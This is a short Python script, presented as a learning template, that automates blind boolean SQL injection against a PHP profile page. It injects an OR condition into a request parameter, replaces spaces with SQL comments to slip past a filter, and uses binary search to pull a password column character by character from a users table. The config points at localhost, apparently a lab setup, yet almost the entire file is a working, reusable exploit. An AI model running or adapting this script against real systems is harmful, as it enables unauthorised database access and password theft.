#!/usr/bin/env python3
"""
Blind Boolean SQLi — Minimal Script (Learning Template)
=========================================================
Stripped to essentials: ~30 lines. No sanity checks, no progress bars.

Config: URL, COOKIE, INJECT_PARAM, EXTRA_PARAMS, MARKER, MARKER_POLARITY,
        TARGET_TABLE, TARGET_COLUMN, TARGET_ROW_ID

How it works:
  - Injects: <INJECT_PARAM>=-1/**/OR/**/(condition)
  - Space bypass: /**/ instead of spaces (bypasses strpos filter)
  - Binary search on ASCII 32-126: ~7 requests per char

Marker polarity:
  - "present_true":  marker IS in response when condition TRUE (e.g., "Followed" badge)
  - "absent_true":   marker NOT in response when condition TRUE (e.g., "Follow" button on 0 rows)
"""

import requests

# ==================== CONFIG ====================
URL = "http://localhost/profile.php"
COOKIE = {"PHPSESSID": "YOUR_SESSION_HERE"}
INJECT_PARAM = "receiver_id"
EXTRA_PARAMS = {"user_id": "14"}
MARKER = "Followed"               # HTML string to look for
MARKER_POLARITY = "present_true"  # "present_true" or "absent_true"
TARGET_TABLE = "users"
TARGET_COLUMN = "backup_password"
TARGET_ROW_ID = 1
# ================================================

def check(condition):
    """True if condition is TRUE (based on marker presence in response)."""
    payload = "-1/**/OR/**/(" + condition + ")"
    params = dict(EXTRA_PARAMS)
    params[INJECT_PARAM] = payload
    r = requests.get(URL, params=params, cookies=COOKIE)
    if MARKER_POLARITY == "present_true":
        return MARKER in r.text
    else:
        return MARKER not in r.text

# Find length
length = 0
for n in range(1, 200):
    if check(f"(SELECT/**/LENGTH({TARGET_COLUMN})/**/FROM/**/{TARGET_TABLE}/**/WHERE/**/id={TARGET_ROW_ID})={n}"):
        length = n
        break
print("Length:", length)

# Extract each char via binary search
password = ""
for pos in range(1, length + 1):
    low, high = 32, 126
    while low < high:
        mid = (low + high) // 2
        cond = f"(SELECT/**/ASCII(SUBSTRING({TARGET_COLUMN},{pos},1))/**/FROM/**/{TARGET_TABLE}/**/WHERE/**/id={TARGET_ROW_ID})>{mid}"
        if check(cond):
            low = mid + 1
        else:
            high = mid
    password += chr(low)
    print(f"[{pos}/{length}] {password}")

print(f"{TARGET_COLUMN}:", password)
